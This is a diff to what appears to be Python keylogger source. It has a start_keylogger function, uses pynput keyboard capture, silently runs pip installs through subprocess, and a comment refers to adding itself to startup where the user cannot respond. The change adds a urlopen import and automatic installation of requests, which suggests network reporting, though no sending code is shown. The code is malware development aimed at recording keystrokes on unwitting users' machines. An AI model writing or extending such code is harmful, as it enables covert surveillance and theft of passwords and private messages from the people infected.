@@ -16,6 +16,7 @@ import time
 from typing import final
 from datetime import date
 from tkinter import TclError, Tk
+from urllib.request import urlopen
 from pynput import keyboard
 from requests.models import Response
 from requests.sessions import PreparedRequest
@@ -53,6 +54,12 @@ def imports():
         alr = subprocess.check_output(
             "pip install pyttsx3", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         import pyttsx3
+    try:
+        import requests
+    except ModuleNotFoundError:
+        alr = subprocess.check_output(
+            "pip install requests", shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        import requests
 
 
 imports()
@@ -130,13 +137,13 @@ def start_keylogger():
                 print("made1")
                 e.close()
 
-    def subprocess_commands():
-        os.system("pip install requests")  # installing modules
-        os.system("pip install pynput")
-        os.system("pip install pywin32")
-        # I made this a thread because if this already exists in the startup, it will ask you for an input to override it. The user obviously can't answer the input.
+    # def subprocess_commands():
+    #     os.system("pip install requests")  # installing modules
+    #     os.system("pip install pynput")
+    #     os.system("pip install pywin32")
+    #     # I made this a thread because if this already exists in the startup, it will ask you for an input to override it. The user obviously can't answer the input.
 
-    subprocess_commands()
+    # subprocess_commands()
 
     def log_window():
         # This feature will only be available if the client machine is on windows
